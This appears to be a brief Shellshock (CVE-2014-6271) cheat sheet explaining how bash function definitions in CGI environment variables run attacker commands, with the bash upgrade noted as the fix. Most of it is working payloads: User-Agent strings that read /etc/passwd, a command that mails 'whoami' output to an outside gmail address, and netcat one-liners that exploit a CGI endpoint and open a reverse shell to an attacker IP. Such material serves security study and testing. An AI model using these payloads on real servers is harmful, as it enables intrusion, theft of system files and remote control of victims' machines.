# CVE-2014-6271

* When you have a CGI script on a web server, this script automatically  reads certain environment variables, for example your IP address, your  browser version, and information about the local system.
* This would mean that – without having any credentials to the webserver – as soon as you access the CGI script it would read your environment  variables; and if these environment variables contain the exploit  string, the script would also execute the command that you have  specified.

https://blog.cloudflare.com/inside-shellshock/

* Suppose the attacker change the User-Agent header above from `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36` to simply `() { :; }; /bin/eject`. This creates the following variable inside a web server:

  ```bash
  USER-AGENT=() { :; }; /bin/eject
  ```

* The solution is to upgrade bash to a version that doesn't interpret `() { :; };` in a special way.



### To read files

* To extract private information, attackers are using a couple of techniques. The simplest extraction attacks are in the form:

  ```bash
  () {:;}; /bin/cat /etc/passwd
  ```

  or

  ```bash
  () {:;}; echo $(</etc/passwd)
  ```

  

* In one attack they simply email private files to themselves.  To get data out via email, attackers are using the `mail` command like this:

  ```bash
  () { :;}; /bin/bash -c \"whoami | mail -s 'example.com l' xxxxxxxxxxxxxxxx@gmail.com
  ```



### Exploitation

* ```bash
  echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
  ```



### Reverse shell

* ```bash
  echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
  ```